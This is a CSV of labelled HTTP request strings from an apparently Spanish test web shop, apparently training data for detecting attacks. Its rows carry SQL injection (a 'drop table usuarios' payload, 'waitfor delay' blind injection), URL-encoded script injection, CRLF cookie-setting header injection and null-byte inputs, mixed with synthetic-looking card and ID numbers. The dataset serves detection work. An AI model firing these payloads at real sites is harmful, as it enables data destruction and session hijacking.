request,label
id 2 nombre jamï¿½n ibï¿½rico precio 85 cantidad '; drop table usuarios; select * from datos where nombre like '% b1 aï¿½adir al carrito id 2 nombre jamï¿½n ibï¿½rico precio 85 cantidad '; drop table usuarios; select *,1
from datos where nombre like '% b1 aï¿½adir al carrito id 2/ nombre jamï¿½n ibï¿½rico precio 85 cantidad 49 b1 aï¿½adir al carrito id 2/ nombre jamï¿½n ibï¿½rico precio 85 cantidad 49 b1 aï¿½adir al carrito modo entrar,1
"login bob@.parosproxy.org pwd 84m3ri156 remember on b1 entrar modo entrar login bob@.parosproxy.org pwd 84m3ri156 remember on b1 entrar ""modo entrar login grimshaw pwd g//lac,iar remember on b1 entrar"" ""modo",1
"entrar login grimshaw pwd g//lac,iar remember on b1 entrar"" modo entrar login grimshaw pwd 84m3ri156 remembera on b1 entrar modo entrar login grimshaw pwd 84m3ri156 remembera on b1 entrar ida 2 ida 2 errormsg",1
"errormsg errormsga credenciales incorrectas errormsga credenciales incorrectas ""modo insertar precio 183','0','0');waitfor delay '0:0:15';-- b1 pasar por caja"" ""modo insertar precio 183','0','0');waitfor delay '0:0:15';-- b1 pasar",1
"por caja"" modo insertar precio 183 b1 pasar por caja/ modo insertar precio 183 b1 pasar por caja/ modo insertar precio 183 b1a pasar por caja modo insertar precio 183 b1a pasar por caja ""modo registro login armand",1
"password prusiato nombre samia apellidos catalayud mirabet email balademas.mareuil6@enlanzarote.com.vc dni 28178710f direccion c/ cala, 9, ciudad mutxamel cp 25332 provincia zaragoza ntc 8608089924764976 b1",1
"registrar"" ""modo registro%3cscript%3ealert%28%22paros%22%29%3b%3c%2fscript%3e login armand password prusiato nombre samia apellidos catalayud mirabet email balademas.mareuil6@enlanzarote.com.vc dni",1
"28178710f direccion c/ cala, 9, ciudad mutxamel cp 25332 provincia zaragoza ntc 8608089924764976 b1 registrar"" ""modo registro%3cscript%3ealert%28%22paros%22%29%3b%3c%2fscript%3e login armand password",1
"prusiato nombre samia apellidos catalayud mirabet email balademas.mareuil6@enlanzarote.com.vc dni 28178710f direccion c/ cala, 9, ciudad mutxamel cp 25332 provincia zaragoza ntc 8608089924764976 b1 registrar""",1
"""modo registro login armand password prusiato nombre any%0d%0aset-cookie%3a tamper%3d5765205567234876235 apellidos catalayud mirabet email balademas.mareuil6@enlanzarote.com.vc dni 28178710f direccion",1
"c/ cala, 9, ciudad mutxamel cp 25332 provincia zaragoza ntc 8608089924764976 b1 registrar"" ""modo registro login armand password prusiato nombre any%0d%0aset-cookie%3a tamper%3d5765205567234876235",1
"apellidos catalayud mirabet email balademas.mareuil6@enlanzarote.com.vc dni 28178710f direccion c/ cala, 9, ciudad mutxamel cp 25332 provincia zaragoza ntc 8608089924764976 b1 registrar"" ""modo registro login",1
"bau*gnon password prusiato nombre samia apellidos catalayud mirabet email balademas.mareuil6@enlanzarote.com.vc dni 28178710f direccion c/ cala, 9, ciudad mutxamel cp 25332 provincia zaragoza ntc",1
"8608089924764976 b1 registrar"" ""modo registro login bau*gnon password prusiato nombre samia apellidos catalayud mirabet email balademas.mareuil6@enlanzarote.com.vc dni 28178710f direccion c/ cala, 9, ciudad",1
"mutxamel cp 25332 provincia zaragoza ntc 8608089924764976 b1 registrar"" ""modo registro login armand password prusiato nombre samia apellidos catalayud mirabet email balademas.mareuil6@enlanzarote.com.vc dnia",1
"28178710f direccion c/ cala, 9, ciudad mutxamel cp 25332 provincia zaragoza ntc 8608089924764976 b1 registrar"" ""modo registro login armand password prusiato nombre samia apellidos catalayud mirabet email",1
"balademas.mareuil6@enlanzarote.com.vc dnia 28178710f direccion c/ cala, 9, ciudad mutxamel cp 25332 provincia zaragoza ntc 8608089924764976 b1 registrar"" b2 vaciar carrito| b2 vaciar carrito| b2a vaciar carrito b2a",1
"vaciar carrito ""modo registro login thyagara password fuerte nombre sol apellidos gorgone oteo email tissier@b-sign.cg dni 03028605b direccion calle alboran 39, ciudad millanes cp 49731 provincia tarragona ntc",1
"4096797311989091sessionid 12312312 username b1 registrar"" ""modo registro login thyagara password fuerte nombre sol apellidos gorgone oteo email tissier@b-sign.cg dni 03028605b direccion calle alboran 39, ciudad",1
"millanes cp 49731 provincia tarragona ntc 4096797311989091sessionid 12312312 username b1 registrar"" ""modo registro login thyagara password fuerte nombre sol apellidos gorgone oteo email tissier@b-sign.cg dni %00",1
"direccion calle alboran 39, ciudad millanes cp 49731 provincia tarragona ntc 4096797311989091 b1 registrar"" ""modo registro login thyagara password fuerte nombre sol apellidos gorgone oteo email tissier@b-sign.cg dni",1
"%00 direccion calle alboran 39, ciudad millanes cp 49731 provincia tarragona ntc 4096797311989091 b1 registrar"" ""modo registro login thyagara password fuerte nombre il,i?dio apellidos gorgone oteo email tissier@b-",1
"sign.cg dni 03028605b direccion calle alboran 39, ciudad millanes cp 49731 provincia tarragona ntc 4096797311989091 b1 registrar"" ""modo registro login thyagara password fuerte nombre il,i?dio apellidos gorgone oteo",1
"email tissier@b-sign.cg dni 03028605b direccion calle alboran 39, ciudad millanes cp 49731 provincia tarragona ntc 4096797311989091 b1 registrar"" ""modo registro login thyagara password fuerte nombre sol apellidosa",1
"gorgone oteo email tissier@b-sign.cg dni 03028605b direccion calle alboran 39, ciudad millanes cp 49731 provincia tarragona ntc 4096797311989091 b1 registrar"" ""modo registro login thyagara password fuerte nombre sol",1
"apellidosa gorgone oteo email tissier@b-sign.cg dni 03028605b direccion calle alboran 39, ciudad millanes cp 49731 provincia tarragona ntc 4096797311989091 b1 registrar"" id 1 nombre jamï¿½n ibï¿½rico precio 85",1
cantidad bob@.parosproxy.org b1 aï¿½adir al carrito id 1 nombre jamï¿½n ibï¿½rico precio 85 cantidad bob@.parosproxy.org b1 aï¿½adir al carrito id 3/ nombre jamï¿½n ibï¿½rico precio 85 cantidad 1 b1 aï¿½adir al,1
carrito id 3/ nombre jamï¿½n ibï¿½rico precio 85 cantidad 1 b1 aï¿½adir al carrito id 1 nombre jamï¿½n ibï¿½rico precio 85 cantidad 1 b1a aï¿½adir al carrito id 1 nombre jamï¿½n ibï¿½rico precio 85 cantidad 1 b1a,1
aï¿½adir al carrito modo entrar login modestin pwd c69p04e13 remember off b1 entrar modo entrar login bob%40%3cscript%3ealert%28paros%29%3c%2fscript%3e.parosproxy.org pwd c69p04e13 remember off b1 entrar,1
modo entrar login bob%40%3cscript%3ealert%28paros%29%3c%2fscript%3e.parosproxy.org pwd c69p04e13 remember off b1 entrar modo entrar login modestin pwd es'pec'ia/l remember off b1 entrar modo entrar login,1
modestin pwd es'pec'ia/l remember off b1 entrar modo entrar logina modestin pwd c69p04e13 remember off b1 entrar modo entrar logina modestin pwd c69p04e13 remember off b1 entrar id 1 id %3f id %3f ida 1 ida 1,1
errormsg credenciales incorrectasbob%40%3cscript%3ealert%28paros%29%3c%2fscript%3e.parosproxy.org errormsg credenciales incorrectasbob%40%3cscript%3ealert%28paros%29%3c%2fscript%3e.parosproxy.org,1
"""errormsg """"><"" ""errormsg """"><"" errormsga credenciales incorrectas errormsga credenciales incorrectas modo insertar precio 1764any%0aset-cookie%3a tamper%3d1041264011025374727 b1 pasar por caja modo insertar",1
precio 1764any%0aset-cookie%3a tamper%3d1041264011025374727 b1 pasar por caja modo insertar precio 1764 b1 confirmar/ modo insertar precio 1764 b1 confirmar/ modoa insertar precio 1764 b1 pasar por caja,1
"modoa insertar precio 1764 b1 pasar por caja ""modo registro login audy password 8a9c27','0','0');waitfor delay '0:0:15';-- nombre juan apellidos ricart rizzi email taube@farmaoferta.bi dni 94839637b direccion calle san",1
"indalencio 168 ciudad san josï¿½ del valle cp 33783 provincia zamora ntc 8868360012752422 b1 registrar"" ""modo registro login audy password 8a9c27','0','0');waitfor delay '0:0:15';-- nombre juan apellidos ricart rizzi email",1
"taube@farmaoferta.bi dni 94839637b direccion calle san indalencio 168 ciudad san josï¿½ del valle cp 33783 provincia zamora ntc 8868360012752422 b1 registrar"" modo registro login audy password 8a9c27 nombre ?",1
p'rï¿½spero apellidos ricart rizzi email taube@farmaoferta.bi dni 94839637b direccion calle san indalencio 168 ciudad san josï¿½ del valle cp 33783 provincia zamora ntc 8868360012752422 b1 registrar modo registro login,1
audy password 8a9c27 nombre ?p'rï¿½spero apellidos ricart rizzi email taube@farmaoferta.bi dni 94839637b direccion calle san indalencio 168 ciudad san josï¿½ del valle cp 33783 provincia zamora ntc,1
8868360012752422 b1 registrar modo registro logina audy password 8a9c27 nombre juan apellidos ricart rizzi email taube@farmaoferta.bi dni 94839637b direccion calle san indalencio 168 ciudad san josï¿½ del valle cp,1
33783 provincia zamora ntc 8868360012752422 b1 registrar modo registro logina audy password 8a9c27 nombre juan apellidos ricart rizzi email taube@farmaoferta.bi dni 94839637b direccion calle san indalencio 168,1
ciudad san josï¿½ del valle cp 33783 provincia zamora ntc 8868360012752422 b1 registrar b2 bob%40%3cscript%3ealert%28paros%29%3c%2fscript%3e.parosproxy.org b2,1
"bob%40%3cscript%3ealert%28paros%29%3c%2fscript%3e.parosproxy.org b2a vaciar carrito b2a vaciar carrito ""modo registro login ballarte password mist66l nombre zorella apellidos morera email cossar@asdn.be dni",1
"any%0aset-cookie%3a tamper%3d1041264011025374727 direccion calle alvarez de castro 197, ciudad vila-real cp 19160 provincia jaï¿½n ntc 5645703984950542 b1 registrar"" ""modo registro login ballarte password",1
"mist66l nombre zorella apellidos morera email cossar@asdn.be dni any%0aset-cookie%3a tamper%3d1041264011025374727 direccion calle alvarez de castro 197, ciudad vila-real cp 19160 provincia jaï¿½n ntc",1
"5645703984950542 b1 registrar"" ""modo registro login ballarte password mist66l nombre zorella apellidos morera email cossar@asdn.be dni 36813756w direccion calle alvarez de castro 197, ciudad vila-real cp 19160",1
"provincia jaï¿½n ntc 966948476857778 b1 registrar"" ""modo registro login ballarte password mist66l nombre zorella apellidos morera email cossar@asdn.be dni 36813756w direccion calle alvarez de castro 197, ciudad vila-",1
"real cp 19160 provincia jaï¿½n ntc 966948476857778 b1 registrar"" ""modo registro login ballarte password mist66l nombre zorella apellidos morera email cossar@asdn.be dni 36813756w direccion calle alvarez de castro",1
"197, ciudada vila-real cp 19160 provincia jaï¿½n ntc 5645703984950542 b1 registrar"" ""modo registro login ballarte password mist66l nombre zorella apellidos morera email cossar@asdn.be dni 36813756w direccion calle",1
"alvarez de castro 197, ciudada vila-real cp 19160 provincia jaï¿½n ntc 5645703984950542 b1 registrar"" id 1 nombre vino riojaany%3f%0d%0aset-cookie%3a tamper%3d1041264011025374727%0d%0a precio 39 cantidad",1
73 b1 aï¿½adir al carrito id 1 nombre vino riojaany%3f%0d%0aset-cookie%3a tamper%3d1041264011025374727%0d%0a precio 39 cantidad 73 b1 aï¿½adir al carrito id 1 nombre vino .*?rioja precio 39 cantidad 73 b1,1
"aï¿½adir al carrito id 1 nombre vino .*?rioja precio 39 cantidad 73 b1 aï¿½adir al carrito ""modo entrar login c/?a,ry pwd 0ara7s5o remember on b1 entrar"" ""modo entrar login c/?a,ry pwd 0ara7s5o remember on b1 entrar""",1
modo entrar login lucie8 pwda 0ara7s5o remember on b1 entrar modo entrar login lucie8 pwda 0ara7s5o remember on b1 entrar id 1%20 id 1%20 ida 1 ida 1 errormsg any%0d%0aset-cookie%3a,1
tamper%3d5765205567234876235 errormsg any%0d%0aset-cookie%3a tamper%3d5765205567234876235 errormsga credenciales incorrectas errormsga credenciales incorrectas modo insertar precio 306 b1 pasar por,1
"caja/ modo insertar precio 306 b1 pasar por caja/ modoa insertar precio 306 b1 pasar por caja modoa insertar precio 306 b1 pasar por caja ""modo registro login couse password remanoso nombre viviana apellidos guimera",1
"faraco"""" and """"1"""" """"1 email andre@alfombra.com.me dni 13758311x direccion calle la fuente, 59, 13?b ciudad algadefe cp 46910 provincia burgos ntc 5183768775927993 b1 registrar"" ""modo registro login couse password",1
"remanoso nombre viviana apellidos guimera faraco"""" and """"1"""" """"1 email andre@alfombra.com.me dni 13758311x direccion calle la fuente, 59, 13?b ciudad algadefe cp 46910 provincia burgos ntc 5183768775927993 b1",1
